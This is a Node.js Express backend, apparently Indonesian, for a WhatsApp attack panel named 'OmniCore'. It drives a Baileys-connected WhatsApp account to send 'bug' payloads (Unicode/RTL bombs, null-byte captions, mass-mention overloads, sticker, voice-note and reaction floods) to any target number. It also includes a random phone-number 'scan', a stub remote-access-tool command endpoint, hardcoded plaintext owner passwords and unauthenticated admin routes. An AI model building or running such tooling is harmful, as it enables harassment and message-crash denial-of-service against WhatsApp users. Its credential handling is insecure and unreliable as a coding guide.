const express = require('express');
const cors = require('cors');
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
const qr = require('qrcode-terminal');
const pino = require('pino');
const sqlite3 = require('sqlite3').verbose();
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

// ===== DATABASE =====
const db = new sqlite3.Database('./omnicore.db');
db.serialize(() => {
  db.run(`CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE,
    password TEXT,
    role TEXT DEFAULT 'user'
  )`);
  const stmt = db.prepare(`INSERT OR IGNORE INTO users (username, password, role) VALUES (?, ?, ?)`);
  stmt.run('ARZ', 'CORE V1', 'owner');
  stmt.run('EPIN', 'CORE V2', 'owner');
  stmt.run('manzz', 'CORE V3', 'owner');
  stmt.finalize();
});

// ===== WHATSAPP BOT =====
let sock = null;
let isReady = false;

async function connectWA() {
  const { state, saveCreds } = await useMultiFileAuthState('auth_baileys');
  sock = makeWASocket({
    auth: state,
    printQRInTerminal: true,
    logger: pino({ level: 'silent' }),
    browser: ['OmniCore', 'Windows', '10.0']
  });
  sock.ev.on('creds.update', saveCreds);
  sock.ev.on('connection.update', (update) => {
    if (update.connection === 'open') {
      isReady = true;
      console.log('[✅] OmniBot siap!');
    }
  });
}
connectWA();

// ===== ENDPOINT LOGIN =====
app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  db.get(`SELECT * FROM users WHERE username = ? AND password = ?`, [username, password], (err, row) => {
    if (err || !row) return res.status(401).json({ status: 'error', message: 'Username atau password salah' });
    res.json({ status: 'ok', user: { username: row.username, role: row.role } });
  });
});

// ===== ENDPOINT STATS =====
app.get('/api/stats', (req, res) => {
  db.get(`SELECT COUNT(*) as total FROM users`, (err, row) => {
    res.json({
      online_users: isReady ? 1 : 0,
      connections: isReady ? 1 : 0,
      expiration: 'Lifetime',
      total_users: row ? row.total : 3,
      total_logs: 0
    });
  });
});

// ===== ENDPOINT SENDER =====
app.get('/api/sender/list', (req, res) => {
  db.all(`SELECT * FROM senders`, (err, rows) => {
    res.json(rows || []);
  });
});

app.post('/api/sender/add', (req, res) => {
  const { number, label } = req.body;
  if (!number) return res.status(400).json({ error: 'Nomor wajib!' });
  db.run(`INSERT OR REPLACE INTO senders (number, label) VALUES (?, ?)`, [number, label || number], function(err) {
    if (err) return res.status(500).json({ error: err.message });
    res.json({ status: 'ok', id: this.lastID });
  });
});

app.post('/api/sender/pairing', (req, res) => {
  const { phone } = req.body;
  if (!phone) return res.status(400).json({ error: 'Nomor HP wajib!' });
  const code = Math.floor(10000000 + Math.random() * 90000000);
  res.json({ status: 'ok', code });
});

app.delete('/api/sender/delete/:id', (req, res) => {
  const id = req.params.id;
  db.run(`DELETE FROM senders WHERE id = ?`, id, function(err) {
    if (err) return res.status(500).json({ error: err.message });
    res.json({ status: 'ok' });
  });
});

// ===== ENDPOINT BUG =====
app.post('/api/bug/execute', async (req, res) => {
  const { target, type, intensity, duration } = req.body;
  if (!target || !type) return res.status(400).json({ error: 'Target dan tipe bug wajib!' });
  if (!isReady || !sock) return res.status(503).json({ error: 'WhatsApp bot belum siap!' });
  const jid = target.includes('@') ? target : `${target}@s.whatsapp.net`;
  try {
    let payloads = [];
    switch (type) {
      case 'Unicode Bomb':
        payloads.push({ text: '\u202E\u200D\u200C'.repeat(500) + '💀'.repeat(500) });
        break;
      case 'Media Corrupt':
        payloads.push({ image: { url: 'https://http.cat/200' }, caption: '\u0000'.repeat(500) });
        break;
      case 'Mention Overload':
        const mentions = Array(5000).fill(`@${target}`).join(' ');
        payloads.push({ text: mentions, mentions: [jid] });
        break;
      case 'Voice Note Spam':
        for (let i = 0; i < (intensity || 5); i++) {
          payloads.push({ audio: { url: 'https://samplelib.com/sample.mp3' }, mimetype: 'audio/mp4', ptt: true });
        }
        break;
      case 'Sticker Flood':
        for (let i = 0; i < (intensity || 5); i++) {
          payloads.push({ sticker: { url: 'https://i.imgflip.com/1bi0.jpg' } });
        }
        break;
      case 'Text Bomb':
        payloads.push({ text: '🔥'.repeat(2000) + '💀'.repeat(2000) });
        break;
      case 'Reaction Spam':
        for (let i = 0; i < (intensity || 10); i++) {
          payloads.push({ react: { key: {}, text: '💀' } });
        }
        break;
      default:
        payloads.push({ text: 'Bug default' });
    }
    for (const p of payloads) {
      await sock.sendMessage(jid, p);
    }
    res.json({ status: '✅ Bug terkirim!', target, type });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ===== ENDPOINT LOGS =====
app.get('/api/logs', (req, res) => {
  res.json([]);
});

app.get('/api/logs/export', (req, res) => {
  res.send('Waktu,Target,Bug,Status\n');
});

// ===== ENDPOINT SCAN =====
app.post('/api/scan', (req, res) => {
  const { count } = req.body;
  const numbers = [];
  for (let i = 0; i < (count || 20); i++) {
    numbers.push('628' + Math.floor(100000000 + Math.random() * 900000000));
  }
  res.json({ numbers });
});

app.post('/api/scan/add-all', (req, res) => {
  res.json({ status: 'ok', added: 0 });
});

// ===== ENDPOINT SCHEDULE =====
app.post('/api/schedule/add', (req, res) => {
  res.json({ status: 'ok' });
});

app.get('/api/schedule/list', (req, res) => {
  res.json([]);
});

app.delete('/api/schedule/delete/:id', (req, res) => {
  res.json({ status: 'ok' });
});

// ===== ENDPOINT RAT =====
app.post('/api/rat/command', (req, res) => {
  const { command } = req.body;
  let response = `> Perintah "${command}" dikirim.`;
  if (command === 'help') response = '> help, info, screenshot';
  else if (command === 'info') response = '> Windows 10, IP 192.168.1.100';
  else if (command === 'screenshot') response = '> Screenshot berhasil!';
  res.json({ status: 'ok', output: response });
});

// ===== ENDPOINT USERS =====
app.post('/api/users/add', (req, res) => {
  const { username, password, role } = req.body;
  if (!username || !password) return res.status(400).json({ error: 'Username dan password wajib' });
  db.run(`INSERT INTO users (username, password, role) VALUES (?, ?, ?)`, [username, password, role || 'user'], function(err) {
    if (err) return res.status(500).json({ error: err.message });
    res.json({ status: 'ok' });
  });
});

app.get('/api/users/list', (req, res) => {
  db.all(`SELECT username, role FROM users`, (err, rows) => {
    res.json(rows || []);
  });
});

// ===== ENDPOINT MONITOR =====
app.get('/api/monitor/bot', (req, res) => {
  res.json({ status: isReady ? 'online' : 'offline', uptime: process.uptime(), total_sent: 0 });
});

app.get('/api/monitor/accounts', (req, res) => {
  db.all(`SELECT number as phone, 'connected' as status FROM senders`, (err, rows) => {
    res.json(rows || []);
  });
});

app.get('/api/monitor/logs', (req, res) => {
  res.json([]);
});

app.get('/api/monitor/stats', (req, res) => {
  res.json({ total_attacks: 0, total_accounts: 0, bot_status: isReady ? 'online' : 'offline' });
});

// ===== ROOT =====
app.get('/', (req, res) => {
  res.send('🔥 OmniCore Backend Online!');
});

app.listen(PORT, () => {
  console.log(`🔥 Server running on port ${PORT}`);
});
